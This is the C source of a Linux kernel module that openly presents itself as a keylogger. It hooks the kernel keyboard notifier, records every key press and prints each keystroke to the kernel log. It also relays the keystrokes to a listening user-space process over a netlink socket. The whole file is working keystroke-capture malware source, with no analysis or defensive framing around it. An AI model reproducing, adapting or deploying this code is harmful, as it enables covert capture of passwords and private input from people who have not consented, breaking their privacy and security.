#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/netlink.h>
#include <net/sock.h>
#include <linux/skbuff.h>

#define NETLINK_USER 31

struct sock *nl_sk = NULL;
static int user_pid = 0;  // Global PID storage for the user-space application

static void send_keystroke_to_user(int keycode, char ascii_char) {
    struct sk_buff *skb_out;
    struct nlmsghdr *nlh;
    int msg_size = sizeof(int) + sizeof(char);
    int res;

    // Ensure user_pid is set before trying to send
    if (user_pid == 0) {
        printk(KERN_WARNING "Keylogger: User PID not set. Cannot send message.\n");
        return;
    }

    // Allocate a new socket buffer
    skb_out = nlmsg_new(msg_size, GFP_KERNEL);
    if (!skb_out) {
        printk(KERN_ERR "Keylogger: Failed to allocate new skb\n");
        return;
    }

    // Fill the netlink message header
    nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
    if (!nlh) {
        printk(KERN_ERR "Keylogger: Failed to add message to skb\n");
        kfree_skb(skb_out);  // Free skb on error
        return;
    }

    NETLINK_CB(skb_out).dst_group = 0;  // Not in multicast group

    // Copy the keystroke data into the message payload
    memcpy(nlmsg_data(nlh), &keycode, sizeof(int));
    memcpy(nlmsg_data(nlh) + sizeof(int), &ascii_char, sizeof(char));

    // Send the message to the user-space application
    res = nlmsg_unicast(nl_sk, skb_out, user_pid);
    if (res < 0) {
        printk(KERN_ERR "Keylogger: Error while sending message to user-space, res=%d\n", res);
        kfree_skb(skb_out);  // Free skb if unicast fails
    }
}

static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYSYM && param->down) {
        printk(KERN_INFO "Keylogger: Captured keycode: %d, ASCII: %c\n", param->value, param->value);
        send_keystroke_to_user(param->value, param->value);
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
        .notifier_call = keylogger_notifier
};

static void netlink_recv_msg(struct sk_buff *skb) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)skb->data;
    user_pid = nlh->nlmsg_pid; // Store the PID for responding to user-space
    printk(KERN_INFO "Netlink: Received message from PID: %d\n", user_pid);
    // Optionally, handle more data from user-space if needed
}

static int __init keylogger_init(void) {
    printk(KERN_INFO "Keylogger Module: Initializing...\n");

    // Register the notifier block for keyboard events
    int ret = register_keyboard_notifier(&keylogger_nb);
    if (ret) {
        printk(KERN_ERR "Keylogger Module: Failed to register keyboard notifier\n");
        return ret;
    }

    // Create a netlink socket
    struct netlink_kernel_cfg cfg = {
            .input = netlink_recv_msg,
    };
    nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);
    if (!nl_sk) {
        printk(KERN_ALERT "Keylogger: Error creating socket.\n");
        unregister_keyboard_notifier(&keylogger_nb);
        return -ENOMEM;
    }

    printk(KERN_INFO "Keylogger Module: Registered keyboard notifier and netlink socket successfully\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    printk(KERN_INFO "Keylogger Module: Exiting...\n");

    // Unregister the notifier block
    unregister_keyboard_notifier(&keylogger_nb);

    // Close the netlink socket
    if (nl_sk) {
        netlink_kernel_release(nl_sk);
    }

    printk(KERN_INFO "Keylogger Module: Unregistered keyboard notifier and closed netlink socket successfully\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ariel Ayalon");
MODULE_DESCRIPTION("A keylogger kernel module with netlink communication");
